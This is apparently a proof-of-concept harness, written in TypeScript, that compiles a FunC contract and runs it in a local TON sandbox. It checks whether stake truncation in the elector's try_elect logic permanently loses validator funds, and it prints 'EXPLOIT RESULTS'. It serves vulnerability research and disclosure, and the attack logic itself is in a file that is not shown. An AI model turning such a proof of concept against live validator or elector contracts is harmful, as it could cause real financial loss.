import { Blockchain } from '@ton/sandbox';
import { Cell, Address, beginCell } from '@ton/core';
import { compileFunc } from '@ton-community/func-js';
import * as fs from 'fs';
import * as path from 'path';
async function main() {
    console.log("Compiling simplified PoC...");
    const codeResult = await compileFunc({
        targets: ['stdlib.fc', 'poc_try_elect.fc'],
        sources: {
            'stdlib.fc': fs.readFileSync(path.resolve('../crypto/smartcont/stdlib.fc'), 'utf-8'),
            'poc_try_elect.fc': fs.readFileSync(path.resolve('./poc_try_elect.fc'), 'utf-8'),
        },
    });
    if (codeResult.status === 'error') {
        console.error(codeResult.message);
        process.exit(1);
    }
    console.log("Compilation successful.");
    const code = Cell.fromBoc(Buffer.from(codeResult.codeBoc, 'base64'))[0];
    const blockchain = await Blockchain.create();
    const address = Address.parseRaw('0:1111111111111111111111111111111111111111111111111111111111111111');
    await blockchain.setShardAccount(address, {
        account: {
            addr: address,
            storage: {
                lastTransLt: 0n,
                balance: { coins: 1000000n },
                state: {
                    type: 'active',
                    state: {
                        splitDepth: null,
                        special: null,
                        code: code,
                        data: beginCell().endCell()
                    }
                }
            },
            storageStats: {
                used: { cells: 0n, bits: 0n, publicCells: 0n },
                lastPaid: 0,
                duePayment: null
            }
        },
        lastTransactionHash: 0n,
        lastTransactionLt: 0n
    });
    // Test parameters
    const original_stake = 150000;
    const max_stake = 50000;
    console.log(`Simulating try_elect with original_stake = ${original_stake} TON, max_stake = ${max_stake} TON...`);
    const res = await blockchain.runGetMethod(address, 'poc_exploit', [
        { type: 'int', value: BigInt(original_stake) },
        { type: 'int', value: BigInt(max_stake) }
    ]);
    const totalAccounted = res.stackReader.readBigNumber();
    const lostAmount = res.stackReader.readBigNumber();
    console.log(`\n--- EXPLOIT RESULTS ---`);
    console.log(`Original Stake sent by validator: ${original_stake} TON`);
    console.log(`Max Stake allowed by config:      ${max_stake} TON`);
    console.log(`Total amount accounted for:       ${totalAccounted.toString()} TON (Frozen + Refunded)`);
    console.log(`Amount permanently LOST:          ${lostAmount.toString()} TON`);
    console.log(`-----------------------\n`);
    if (lostAmount > 0n) {
        console.log("VULNERABILITY CONFIRMED: Funds were lost during stake truncation in try_elect.");
    }
    else {
        console.log("No funds were lost. The logic handled the truncation perfectly.");
    }
}
main().catch(console.error);
